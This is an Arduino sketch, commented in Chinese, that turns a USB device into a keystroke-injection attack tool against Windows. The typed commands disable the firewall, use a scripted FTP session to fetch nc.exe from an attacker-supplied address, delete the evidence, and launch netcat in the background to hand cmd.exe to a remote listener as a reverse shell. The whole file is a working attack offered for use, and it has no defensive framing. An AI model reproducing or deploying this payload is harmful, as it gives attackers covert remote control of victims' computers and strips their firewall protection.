void setup() {
  Keyboard.begin();
  delay(10000);//延时
  Keyboard.press(KEY_LEFT_GUI);
  delay(200); 
  Keyboard.print('r');
  delay(200); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(200); 
  //=========================Run==========================
  Keyboard.println("CMD");
  delay(1000);
  Keyboard.println("CD %userprofile%");
  delay(100);
  Keyboard.println("NETSH FIREWALL SET OPMODE DISABLE");  //关闭FIREWALL防火墙
  delay(2000);
  Keyboard.println("ECHO OPEN [ip] [PORT] > FTP.TXT");  //输入自己的IP及端口，等待对方连接
  delay(100);
  Keyboard.println("ECHO [username] >> FTP.TXT");  //输入用户名
  delay(100);
  Keyboard.println("ECHO [password] >> FTP.TXT");  //输入密码
  delay(100);
  delay(100);
  Keyboard.println("ECHO BIN >> FTP.TXT");
  delay(100);
  Keyboard.println("ECHO GET NC.EXE >> FTP.TXT");  //获取NC程序
  delay(100);
  Keyboard.println("ECHO BYE >> FTP.TXT");
  delay(100);
  Keyboard.println("FTP -S:FTP.TXT");
  delay(100);
  Keyboard.println("DEL FTP.TXT & EXIT");
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(200); 
  Keyboard.print('r');
  delay(200); 
  Keyboard.release(KEY_LEFT_GUI);
  delay(200);
  Keyboard.println("NC.EXE [listener ip] [listener port] -E CMD.EXE -D");  //后台直接监听，输入自己的IP及端口，一旦连接执行CMD命令
  delay(2000);
    Keyboard.press(KEY_LEFT_GUI);
  delay(200); 
  Keyboard.print('r');
  delay(200); 
  Keyboard.release(KEY_LEFT_GUI);
  delay(200);
  Keyboard.println('CMD');
  delay(600);
  Keyboard.println('EXIT');
  //======================================================
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}

void loop() {
}
